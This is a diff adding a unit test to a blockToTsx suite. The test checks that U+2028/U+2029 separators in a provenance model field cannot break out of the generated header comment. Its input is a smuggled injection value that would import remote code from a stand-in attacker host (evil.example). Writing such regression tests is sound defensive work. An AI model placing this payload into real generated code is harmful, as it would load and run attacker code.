@@ -161,6 +161,14 @@ describe("blockToTsx", () => {
     expect(tsx.split("\n")[0]).not.toContain("*/");
   });
 
+  it("the header comment cannot be ended by U+2028/U+2029 (a crafted provenance.model)", () => {
+    const tsx = blockToTsx(HERO, "b-hero", { label: "Hero\u2029x", model: "claude\u2028import('https://evil.example/x.js');//" });
+    const header = tsx.split("\n")[0]!;
+    expect(header).not.toMatch(/[\u2028\u2029]/);
+    expect(tsx.split(/[\n\u2028\u2029]/).filter((line) => line.includes("evil.example"))).toHaveLength(1);
+    expect(header).toContain("evil.example");
+  });
+
   it("compiles with React's types in strict mode, with the assets module next to it", () => {
     const hero = blockToTsx(HERO, "b-hero", { label: "Hero", routes: ROUTES });
     const login = blockToTsx(FORM, "b-login", { label: "Login", routes: ROUTES });
